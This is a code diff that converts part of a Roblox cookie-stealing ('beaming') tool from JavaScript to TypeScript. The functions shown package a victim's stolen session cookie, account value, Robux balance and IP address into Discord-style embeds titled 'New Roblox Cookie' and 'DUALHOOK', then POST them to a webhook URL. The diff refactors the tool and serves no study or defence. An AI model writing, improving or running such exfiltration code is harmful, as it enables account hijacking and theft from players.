@@ -1,4 +1,4 @@
-async function sendWebhook(url, payload) {
+export async function sendWebhook(url: string, payload: any): Promise<boolean> {
   try {
     const res = await fetch(url, {
       method: 'POST',
@@ -11,8 +11,26 @@ async function sendWebhook(url, payload) {
   }
 }
 
-function buildEmbed(data, cookie, tool, ip, ua) {
-  const fields = [
+export interface RobloxData {
+  username: string
+  userId: string
+  rap: number
+  robux: number
+  premium: boolean
+  friendsCount: number
+  avatarUrl?: string
+  items: number
+  accountAgeDays: number
+}
+
+export function buildEmbed(
+  data: RobloxData, 
+  cookie: string, 
+  tool: string, 
+  ip?: string, 
+  ua?: string
+): any {
+  const fields: any[] = [
     { name: 'Username', value: `\`${data.username}\``, inline: true },
     { name: 'User ID', value: `\`${data.userId}\``, inline: true },
     { name: 'RAP', value: `\`${data.rap.toLocaleString()} R$\``, inline: true },
@@ -23,7 +41,9 @@ function buildEmbed(data, cookie, tool, ip, ua) {
     { name: 'Account Age', value: `\`${data.accountAgeDays} days\``, inline: true },
     { name: 'Cookie', value: `\`\`\`\n${cookie}\n\`\`\``, inline: false }
   ]
+  
   if (ip) fields.push({ name: 'IP', value: `\`${ip}\``, inline: true })
+  
   return {
     title: 'New Roblox Cookie',
     description: `**${tool}** beam`,
@@ -34,7 +54,7 @@ function buildEmbed(data, cookie, tool, ip, ua) {
   }
 }
 
-function buildDualhook(data, cookie, hunter, tool) {
+export function buildDualhook(data: RobloxData, cookie: string, hunter: string, tool: string): any {
   return {
     title: `DUALHOOK - ${data.username}`,
     color: 0xff0000,
@@ -48,5 +68,3 @@ function buildDualhook(data, cookie, hunter, tool) {
     timestamp: new Date().toISOString()
   }
 }
-
-module.exports = { sendWebhook, buildEmbed, buildDualhook }
